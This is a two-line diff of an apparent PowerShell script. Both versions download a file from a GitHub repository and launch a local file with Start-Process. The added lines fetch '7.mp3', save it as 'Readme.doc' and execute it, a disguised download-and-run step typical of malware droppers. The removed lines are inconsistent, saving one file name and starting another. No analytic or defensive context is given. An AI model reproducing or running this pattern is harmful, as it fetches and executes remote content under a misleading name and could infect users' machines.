@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/read.docx" -OutFile "readme.docx"
-Start-Process "test.docx"
+Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/7.mp3" -OutFile "Readme.doc"
+Start-Process "ReadMe.doc"
